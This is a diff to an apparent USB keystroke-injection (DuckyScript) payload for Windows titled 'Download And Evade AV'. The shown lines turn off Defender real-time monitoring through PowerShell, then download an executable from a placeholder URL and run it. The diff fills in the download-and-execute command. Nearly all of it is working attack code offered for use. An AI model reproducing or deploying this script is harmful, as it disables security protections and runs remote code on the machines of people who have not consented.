@@ -2,7 +2,7 @@ REM Title: Download And Evade AV
 REM Author: ScreamsTerror
 REM Description: Turns off AV Then Downloads payload 
 REM Target: Windows 
-REM  'Enter text' line 18
+REM  Change 'http://example.com/upl.exe'
 
 DELAY 100
 GUI r
@@ -15,5 +15,5 @@ DELAY 500
 STRING Set-MpPreference -DisableRealtimeMonitoring $true
 ENTER
 DELAY 200
-STRING iwr -Uri '' -O upl.exe;Start-Sleep 1;Start upl.exe;exit
+STRING iwr -Uri 'http://example.com/upl.exe' -OutFile 'upl.exe'; Start-Sleep -Seconds 1; Start-Process 'upl.exe'; exit
 ENTER
